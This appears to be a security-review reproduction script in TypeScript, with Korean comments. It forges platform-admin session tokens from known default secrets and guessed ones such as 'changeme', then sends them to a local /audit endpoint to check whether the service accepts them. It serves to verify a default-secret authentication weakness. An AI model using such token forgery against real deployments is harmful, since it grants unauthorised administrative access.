// R2-H1: 저장소에 공개된 과거 기본 시크릿 5종 각각으로 platform-admin 세션을 위조해 실행 중 :7200 GET /audit에 보낸다. 토큰 출력 없음.
// 실행(루트): node --import ./services/policy-proxy/node_modules/tsx/dist/loader.mjs docs/review/repro/r2/13-h1-forged-defaults.mts
import { signToken } from '../../../../services/policy-proxy/src/tokens.ts';
import { knownDevelopmentSecrets } from '../../../../services/policy-proxy/src/config.ts';
const exp = Math.floor(Date.now() / 1000) + 600;
for (const [i, secret] of [...knownDevelopmentSecrets, '', 'secret', 'changeme'].entries()) {
  const t = signToken({ sub: 'forged-admin', roles: ['platform-admin', 'editor', 'viewer'], exp }, secret, 'session');
  const r = await fetch('http://localhost:7200/audit?limit=1', { headers: { Authorization: 'Bearer ' + t } });
  console.log(`known/guessed secret #${i + 1} (len ${secret.length}) -> GET /audit HTTP ${r.status}`);
}
